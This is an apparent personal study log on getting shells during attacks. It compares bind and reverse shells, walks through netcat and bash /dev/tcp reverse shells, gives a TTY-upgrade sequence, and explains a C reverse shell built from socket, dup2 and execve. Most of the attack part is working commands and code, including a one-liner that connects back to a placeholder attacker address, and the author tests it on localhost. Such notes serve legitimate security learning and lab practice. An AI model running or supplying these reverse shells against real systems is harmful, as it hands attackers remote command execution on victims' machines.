# Day 2 — Shells

## What this day is about
Getting a shell on a target is the goal of most attacks. Once you have a shell, you have control — run commands, move files, pivot. This day covers the two main shell types, how to upgrade a dumb shell, and what a compiled C reverse shell looks like under the hood.

---

## Bind Shell vs Reverse Shell

**Bind shell** — the victim listens, you connect to it.
```
Victim:   nc -nvlp 4444 -e /bin/bash
Attacker: nc <victim_ip> 4444
```
Rarely used in real engagements. If the victim is behind a firewall or NAT, inbound connections get blocked. Also requires you to know the victim's IP and it can't change.

**Reverse shell** — you listen, the victim connects back to you.
```
Attacker: nc -nvlp 4444
Victim:   bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'
```
This is the one that actually works in practice. Outbound connections are almost never blocked. The victim reaches out to you.

---

## What I did

### Bind shell with netcat
Ran `nc -nvlp 4444 -e /bin/bash` on the victim side (one terminal), connected with `nc 127.0.0.1 4444` from attacker side. Ran `id` — got full user and group info back. Shell working.

### Reverse shell with netcat
Listener: `nc -nvlp 4444`
Victim: `bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'`

**Key lesson:** `/dev/tcp` is a bash feature. My default shell is **zsh**, and zsh doesn't support it. Running the command directly in zsh gives `no such file or directory`. Fix: explicitly call bash with `bash -c '...'`.

### TTY upgrade
A raw netcat shell is dumb — no tab completion, no arrow keys, Ctrl+C kills the whole thing, `sudo` won't work. Upgrading to a full TTY fixes all of that.

```bash
# On the victim shell (inside nc):
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Ctrl+Z to background

# On local terminal:
stty raw -echo; fg

# Press Enter twice, then:
export TERM=xterm
```

Now you have a full interactive shell. Prompt changes, tab completion works, Ctrl+C sends SIGINT instead of killing the session.

**Mistake I made first time:** ran the python3 command in my local terminal instead of inside the reverse shell. `hostnamepython3: command not found` was the error. Always make sure you're typing inside the shell that landed on your listener.

### C reverse shell (shell.c)
Compiled and ran the `shell.c` from the repo:

```bash
gcc -o shell shell.c
./shell 127.0.0.1 4444
```

Listener caught the connection, ran `id`, got user info back. No netcat on the victim side — the binary handles the socket connection itself.

---

## How shell.c works

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

for (int i = 0; i < 3; i++) {
    dup2(sockfd, i);   // redirect stdin(0), stdout(1), stderr(2) to socket
}

execve("/bin/sh", NULL, NULL);  // spawn shell — now all I/O flows over the socket
```

Three things happen:
1. A TCP socket is created and connected to the attacker's listener
2. `dup2` redirects all three standard file descriptors to the socket — so everything you type goes to the process and everything it outputs comes back to you
3. `execve` replaces the process with `/bin/sh` — attacker now has a shell

This is the same pattern used in shellcode and real malware, just written cleanly in C.

---

## Key things to remember

- Always use reverse shells over bind shells in real scenarios
- `/dev/tcp` only works in bash — not zsh, not sh, not dash
- A raw shell from nc is not fully interactive — always upgrade with python3 pty or socat
- The TTY upgrade commands run **inside the reverse shell**, not in your local terminal
- `dup2(fd, 0/1/2)` is the core trick in any socket-based shell — redirects I/O to the network connection
- `execve` doesn't return if successful — it replaces the current process entirely

---

## Resources
- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [revshells.com](https://revshells.com) — quick reverse shell one-liner generator
- socat for more stable shells than netcat
